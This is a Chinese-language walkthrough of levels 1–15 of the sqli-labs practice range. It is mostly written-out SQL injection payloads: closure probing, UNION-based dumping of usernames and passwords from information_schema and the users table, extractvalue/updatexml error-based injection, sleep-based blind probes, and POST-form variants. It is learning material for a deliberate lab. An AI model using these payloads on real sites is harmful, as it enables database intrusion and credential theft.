---
title: sql-labsWP
categories:
  - 学习
tags:
  - SQL注入
  - WP
---

[sqli-labs在线靶场](https://buuoj.cn/challenges#sqli-labs)

## 1-10关GET提交

### 第一关

```sql
判断注入方式
?id=1
?id=1' #报错
?id=1' -- + #回显正常，基本可以确认
?id=1' and 1=2 -- + # 报错
?id=1' and 1=1 -- + # 正常 确认

判断列数
?id=1' group by 3 -- +

'判断回显
?id=-1' union select 1,2,3 -- +

'获取库名
?id=-1' union select 1,database(),3 -- +

'获取表名
?id=-1' union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema='security') -- +    

'获取列名
?id=-1' union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_name='users') -- +

'获取数据
?id=-1' union select 1,database(),(select group_concat(username,'~',password) from users) -- +
```

### 第二关

这关和第一关只是注入类型有区别是数字型注入

```sql
?id=1 #正常
?id=1' #报错
?id=1' -- + #报错
?id=1" -- + #报错
?id=1" #报错
?id=1 and 1=1 #正常
?id=1 and 1=2 #报错 确认是数字型注入 

其他内容都一样
```



### 第三关

和前面也差不多，但是是单引号+括号闭合方式

```sql
?id=1 #正常
?id=1 and 1=2 #正常
?id=1' #报错
?id=1' -- + #报错
?id=1" # 正常 可排除
?id=1"-- + # 正常 排除

到这里可以发现不是'' 和""闭合，但也不是数字型
就可以考虑是不是单引号+括号或者双引号+括号组合了 
?id=1') #报错
?id=1') -- + #正常 基本可以确认是')闭合方式，剩下都是和前面一样
```



### 第四关

和第三关差不多，但是是双引号+括号闭合方式



```sql
?id=1 #正常
?id=1 and 1=2 #正常
?id=1' #正常 可排除
?id=1' -- + #正常 
?id=1" # 报错
?id=1"-- + # 报错

到这里可以发现不是'' 和""闭合，但也不是数字型
就可以考虑是不是单引号+括号或者双引号+括号组合了 
?id=1") #报错
?id=1") -- + #正常 基本可以确认是")闭合方式，剩下都是和前面一样
```



### 1-4关总结

**难点**

在于判断数字型注入还是字符型注入，以及闭合方式

可以发现，如果是字符型注入，如果`?id=1'`报错，那么大概率是在单引号闭合的情况，是否有括号，还要根据`?id=1' -- +`来判断，如果该语句也报错，那么基本可以认为是单引号+括号的闭合。

双引号闭合也是同理，输入`?id=1"`报错更有可能是"闭合。

**总结**

快速判断：哪种闭合符号报错，尝试哪种闭合符号

正确判断：布尔逻辑判断



### 第五关

```sql
判断注入方式
?id=1
?id=1' #报错
?id=1' -- + #回显正常，基本可以确认
?id=1' and 1=2 -- + # 报错
?id=1' and 1=1 -- + # 正常 确认

'判断列数
?id=1' group by 3 -- + #正常

'判断回显
?id=-1' union select 1,2,3 -- +  #！！！这里可以发现输入语句之后没有回显，但是根据前面有报错回显，因此可以尝试报错注入，或者布尔盲注（报错注入快，布尔盲注慢但是不用写，跑脚本就行）

报错注入
获取库名
?id=-1' and extractvalue(1,concat('~',database(),'~')) -- +

'获取表名
?id=-1' and extractvalue(1,concat('~',(select group_concat(table_name)from information_schema.tables where table_schema='security'),'~')) -- +

'获取列名
?id=-1' and extractvalue(1,concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~')) -- +

'获取数据
?id=-1' and extractvalue(1,concat('~',(select group_concat(username,'~',password)from users),'~')) -- +
```

### 第六关

和第五题差不多，但是是双引号闭合

```sql
判断注入方式
?id=1
?id=1' #正常 排除单引号闭合
?id=1" #错误
?id=1" -- + #回显正常，基本可以确认
?id=1" and 1=2 -- + # 报错
?id=1" and 1=1 -- + # 正常 确认

剩下内容和上面一题一样
```

### 5-6关总结

**小姿势**

`updatexml(1,2,3)` 括号里要求三个内容

`extractvalue(1,2)`括号里只要求两个内容

`concat(1,2,3)` 括号里要求三个内容

**使用感觉**

报错注入比用脚本还是快一点，敲起来也不麻烦，可以使用的话优先使用报错注入吧



### 第七关

文件注入，不过用脚本也行（~~太菜了，不会文件注入~~），所以这里使用脚本

**注意点**

这里要小心的是闭合方式是单引号+双括号闭合

判断方法和1-4关总结一样，因为`?id=1'和?id=1'-- +`报错，而`?id=1 and 1=1和?id=1 and 1=2` 以及`?id=1" 和 ?id=1" -- +`都正常回显，所以至少是单引号闭合。那么再尝试单引号+一个括号闭合仍然是报错之后，再尝试单引号+两个括号就是正确闭合了

~~我用脚本跑成功了，学会了再修改方法，具体脚本可以看盲注脚本的文章~~

### 第八关

闭合方式是单引号闭合，具体参考前面的内容

```sql
判断注入方式
?id=1
?id=1' #报错
?id=1' -- + #回显正常，基本可以确认
?id=1' and 1=2 -- + # 报错
?id=1' and 1=1 -- + # 正常 确认

判断列数
?id=1' group by 3 -- +

'判断回显
?id=-1' union select 1,2,3 -- + # 这里会发现回显一直是YOU are in .... ，而且还没有报错，那么就可以尝试使用布尔盲注————页面有正确输入和错误输入两种回显，借用正确输入的回显就可以判断
```

### 第九关

不管输入什么，页面都是返回一样的内容，因此可以排除联合查询，报错注入，布尔盲注

就只剩下时间盲注了

```sql
判断闭合方式
?id=1 and sleep(5) #马上执行，说明不是数字型注入
?id=1' and sleep(5) # 隔了5秒执行，说明是单引号闭合
?id=1" and sleep(5) #马上执行，说明不是双引号闭合
```

### 第十关

闭合方式是双引号闭合，判断方法和第九关类似。

### 7-10关总结

盲注时间比报错注入和联合查询花费更多，因此可以使用后两种尽量不适用脚本。

**注意**

记得每次进行盲注脚本之前，要先判断好闭合方式，不然就会~~小丑~~（跑好几遍不行以为是脚本问题）

**总结**

不知道总结什么了，脚本就不在这放了，时间也不早了，给大家拜个早年吧

## POST 提交

**注意页面回显**

### 第十一关

![image-20250319215023148](https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgimage-20250319215023148.png)

见图，一眼顶针是POST注入，所以先填一个1,1，然后提交，再用hackbar （记得开post提交）load一下就可以知道提交内容了。

![image-20250319215208673](https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgimage-20250319215208673.png)

得到提交内容之后就可以开始狠狠注入了

```sql
判断注入闭合
passwd=1 or 1=1 # &submit=Submit&uname=1  #显示Failed，说明不是数字型注入
passwd=1' or 1=1 # &submit=Submit&uname=1         
#这里使用1' or 1=1 的原因是1在数据库中不存在，所以只能用or 1=1 保证输入命令的正确
#如果返回正确内容，比如 Succeess Login in，那么说明闭合方式正确

判断列数
passwd=1 &submit=Submit&uname=1' order by 2 #输入order by 3 报错了

'判断回显'
passwd=1&submit=Submit&uname=1' union select 1,2 # 回显1,2 
#这里不用-1的原因是1本身就不存在，所以还是会返回select 之后的内容

获取库名'
passwd=1&submit=Submit&uname=1' union select 1,database()#

获取表名'
passwd=1&submit=Submit&uname=1' union select (select group_concat(table_name)from information_schema.tables where table_schema='security'),database()#

获取列名'
passwd=1&submit=Submit&uname=2' union select (select group_concat(column_name)from information_schema.columns where table_name='users'),database()#

获取数据'
passwd=1&submit=Submit&uname=2' union select (select group_concat(username,'~',password)from users),database()#
```



### 第十二关

多了个括号，其他没变化

```sql
passwd=1&submit=Submit&uname=1 or 1=1 # 报错
passwd=1&submit=Submit&uname=1' or 1=1 #报错
passwd=1&submit=Submit&uname=1" or 1=1 #报错
'#发现三种都不行，那么可以先尝试一下添加)内容
正好
passwd=1&submit=Submit&uname=1") or 1=1 #成功~~我在说什么，目前思路就是这样了，如果存在过滤怎么办.......~~
剩下内容和前面十一关一样.....

```

### 第十三关

单引号+括号闭合，报错注入

```sql
闭合方式判断就不写了
用报错注入的原因是执行以下语句的时候是没有回显的，那么就用不了联合查询，通过闭合方式的判断，可以知道页面是存在报错注入的，所以可以尝试报错注入
passwd=1&submit=Submit&uname=1') union select 1,2 #

passwd=1&submit=Submit&uname=1') and updatexml(1,concat('~',(database()),'~'),3) #
```

~~剩下不想写了，和报错注入的内容一样~~

### 第十四关

双引号闭合，报错注入

和十三题一样

### 第十五关

单引号闭合，但是怎么样都没有回显，所以只能有布尔盲注或者时间盲注

不过这里没有回显，所以我选择了时间盲注。

**易错点**

**post**提交的内容要相同，要注意`columns=[]`和`table_name='users'`的区别，前者是列表，后者是字符串，列表可以用append函数，字符串不行。

出现报错时，可以先检查代码，然后再去post一下验证是不是语句有问题。

~~也有可能是靶场过期了，运行到一半报错，结果是靶场过期~~
